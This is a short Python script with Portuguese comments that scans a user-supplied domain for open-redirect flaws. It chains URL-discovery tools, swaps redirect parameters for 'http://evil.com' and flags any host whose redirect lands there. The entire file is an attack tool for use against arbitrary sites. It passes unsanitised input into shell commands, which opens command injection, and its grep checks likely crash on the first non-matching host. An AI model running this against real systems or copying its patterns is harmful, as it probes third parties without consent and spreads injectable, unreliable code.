import os
import subprocess

def scan_vulnerabilidades():
    # Definir o domínio-alvo
    target = input("Digite o domínio-alvo: ")

    # Criar um diretório com o nome do alvo
    os.makedirs(target, exist_ok=True)

    # Escolher o tipo de varredura
    print("Please choose for scan:")
    print("1. with alterx")
    print("2. no alterx")
    print("3. with katana")
    escolhas = input()

    # Varredura
    if "1" in escolhas:
        print("Start SCAN")
        comando = f"echo '{target}' | alterx -enrich | waybackurls | dnsx | httpx -silent -mc 302 | grep -a -i =http | qsreplace 'http://evil.com'"
        resultado = subprocess.check_output(comando, shell=True)
        for host in resultado.decode().splitlines():
            comando = f"curl -s -L {host} -I | grep 'evil.com'"
            resultado = subprocess.check_output(comando, shell=True)
            if resultado:
                print(f"{host} \033[0;31mVulnerable\n")

    elif "2" in escolhas:
        print("Start SCAN")
        comando = f"echo '{target}' | waybackurls | dnsx | httpx -silent -mc 302 | grep -a -i =http | qsreplace 'http://evil.com'"
        resultado = subprocess.check_output(comando, shell=True)
        for host in resultado.decode().splitlines():
            comando = f"curl -s -L {host} -I | grep 'evil.com'"
            resultado = subprocess.check_output(comando, shell=True)
            if resultado:
                print(f"{host} \033[0;31mVulnerable\n")

    elif "3" in escolhas:
        print("Start SCAN")
        comando = f"echo '{target}' | katana -silent | dnsx | httpx -silent -mc 302 | grep -a -i =http | qsreplace 'http://evil.com'"
        resultado = subprocess.check_output(comando, shell=True)
        for host in resultado.decode().splitlines():
            comando = f"curl -s -L {host} -I | grep 'evil.com'"
            resultado = subprocess.check_output(comando, shell=True)
            if resultado:
                print(f"{host} \033[0;31mVulnerable\n")

    print("Finished SCAN")

scan_vulnerabilidades()